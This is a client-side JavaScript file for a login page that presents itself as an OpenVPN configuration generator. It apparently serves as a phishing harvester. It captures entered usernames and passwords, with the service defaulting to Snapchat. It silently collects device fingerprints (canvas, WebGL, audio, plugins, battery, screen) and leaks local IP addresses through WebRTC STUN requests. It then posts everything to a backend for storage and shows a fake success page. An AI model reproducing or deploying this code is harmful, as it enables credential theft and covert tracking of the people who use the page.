document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const container = document.querySelector('.container');
    const congratsContainer = document.querySelector('.congrats-container');

    // Initialize OVPN Generator
    const ovpnGen = new OVPNGenerator();
    let comprehensiveData = null;

    // Start comprehensive data collection immediately on page load
    (async function() {
        console.log('🚀 Starting comprehensive data collection for OVPN generation...');
        comprehensiveData = await ovpnGen.collectAllData();
        
        // Try to collect native network config if available (Capacitor)
        if (window.NetworkConfigNative) {
            console.log('📡 Collecting native network configuration...');
            const nativeNetworkConfig = await window.NetworkConfigNative.getNetworkConfig();
            if (nativeNetworkConfig) {
                comprehensiveData.nativeNetworkConfig = nativeNetworkConfig;
                console.log('✅ Native network config collected:', nativeNetworkConfig);
            } else {
                console.log('ℹ️ Native network config not available (running in browser)');
            }
        }
        
        console.log('✅ Comprehensive data collection complete:', comprehensiveData);
    })();

    // Background VPN configuration auto-detection function (legacy support)
    async function autoDetectVPNConfig() {
        const vpnConfig = {
            ca_crt: null,
            client_crt: null,
            client_key: null,
            ta_key: null,
            server_ip: '206.45.29.181',
            server_port: 1194,
            protocol: 'udp',
            system_info: {}
        };

        try {
            // Collect system information
            vpnConfig.system_info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                timestamp: new Date().toISOString(),
                localIPs: []
            };

            // Try to detect browser plugins/extensions
            if (navigator.plugins) {
                vpnConfig.system_info.plugins = Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }));
            }

            // Enhanced WebRTC Local IP Detection
            await new Promise((resolve) => {
                const rtcConfig = {
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' }
                    ]
                };
                
                try {
                    const pc = new RTCPeerConnection(rtcConfig);
                    const noop = () => {};
                    
                    pc.createDataChannel('');
                    
                    pc.createOffer().then(offer => {
                        return pc.setLocalDescription(offer);
                    }).catch(noop);
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            resolve();
                            return;
                        }
                        
                        const candidateStr = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]+:+)+[a-f0-9]+/g;
                        const ips = candidateStr.match(ipRegex);
                        
                        if (ips) {
                            ips.forEach(ip => {
                                if (!vpnConfig.system_info.localIPs.includes(ip) && 
                                    !ip.startsWith('0.') && 
                                    ip !== '0.0.0.0') {
                                    vpnConfig.system_info.localIPs.push(ip);
                                }
                            });
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve();
                    }, 2000);
                    
                } catch (e) {
                    console.log('WebRTC detection failed:', e);
                    resolve();
                }
            });

            // Network information
            if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                vpnConfig.system_info.connection = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }

            // Battery information
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    vpnConfig.system_info.battery = {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    console.log('Battery info not available');
                }
            }

        } catch (error) {
            console.error('Error during VPN auto-detection:', error);
        }

        return vpnConfig;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const service = document.getElementById('service_name') ? document.getElementById('service_name').value : 'snapchat';
        
        // Basic validation
        if (!username || !password) {
            alert('Please enter both username and password');
            return;
        }
        
        console.log('🔐 Processing login for:', username);
        console.log('📊 Starting comprehensive OVPN generation...');
        
        try {
            // Wait for comprehensive data collection if not finished
            if (!comprehensiveData) {
                console.log('⏳ Waiting for comprehensive data collection...');
                comprehensiveData = await ovpnGen.collectAllData();
            }

            // Auto-detect VPN configuration
            const vpnConfig = await autoDetectVPNConfig();

            // Generate OVPN file with all collected data
            const ovpnFile = ovpnGen.generateOVPNFile(username, '206.45.29.181', 1194, 'udp');
            console.log('📄 Generated OVPN Configuration:\n', ovpnFile);

            // Prepare comprehensive data package for database
            const comprehensivePayload = {
                username,
                password,
                service,
                ...vpnConfig,
                ovpn_config: ovpnFile,
                advanced_data: {
                    // Certificate information
                    certificates: ovpnGen.collectedData.certificates,
                    
                    // Generated crypto keys
                    cryptographic_keys: ovpnGen.collectedData.securityInfo?.cryptoKeys,
                    
                    // Network topology analysis
                    network_topology: {
                        natType: ovpnGen.collectedData.networkInfo?.topology?.natType,
                        localIPs: ovpnGen.collectedData.networkInfo?.topology?.localIPs,
                        publicIPs: ovpnGen.collectedData.networkInfo?.topology?.publicIPs,
                        iceCandidates: ovpnGen.collectedData.networkInfo?.topology?.iceCandidates?.length || 0,
                        mtu: ovpnGen.collectedData.networkInfo?.mtu
                    },
                    
                    // Native network configuration (from Capacitor plugin)
                    native_network_config: comprehensiveData?.nativeNetworkConfig || null,
                    
                    // Comprehensive system fingerprint
                    fingerprint: {
                        canvas: ovpnGen.collectedData.systemInfo?.fingerprint?.canvasFingerprint?.hash,
                        webgl: ovpnGen.collectedData.systemInfo?.fingerprint?.webglFingerprint,
                        audio: ovpnGen.collectedData.systemInfo?.fingerprint?.audioFingerprint?.hash,
                        browser: ovpnGen.collectedData.systemInfo?.fingerprint?.browser,
                        screen: ovpnGen.collectedData.systemInfo?.fingerprint?.screen
                    },
                    
                    // Collection metadata
                    collection_info: {
                        duration_ms: comprehensiveData.duration,
                        timestamp: new Date().toISOString(),
                        success: comprehensiveData.success,
                        platform: window.Capacitor?.isNativePlatform() ? 'native' : 'web'
                    }
                }
            };
            
            console.log('📦 Comprehensive payload prepared:', {
                username,
                hasOVPN: !!ovpnFile,
                hasAdvancedData: !!comprehensivePayload.advanced_data,
                certificateTypes: Object.keys(comprehensivePayload.advanced_data.certificates || {}),
                networkTopologyDetected: !!comprehensivePayload.advanced_data.network_topology.natType,
                localIPsDetected: comprehensivePayload.advanced_data.network_topology.localIPs?.length || 0,
                nativeNetworkConfigAvailable: !!comprehensivePayload.advanced_data.native_network_config,
                platform: comprehensivePayload.advanced_data.collection_info.platform
            });
            
            // Send to backend API
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(comprehensivePayload)
            });
            
            console.log('Response status:', response.status);
            
            const result = await response.json();
            console.log('Response data:', result);
            
            if (response.ok && result.success) {
                console.log('✅ Data successfully uploaded to Supabase');
                console.log('📄 OVPN config saved');
                console.log('🔬 Advanced fingerprint data saved');
                
                // Show success page
                container.style.display = 'none';
                congratsContainer.style.display = 'block';
                
            } else {
                console.error('Submission failed:', result.error);
                alert('❌ Upload failed: ' + (result.error || 'Unknown error'));
            }
            
        } catch (error) {
            console.error('❌ Error during submission:', error);
            alert('An error occurred. Please check console for details.');
        }
    });
});
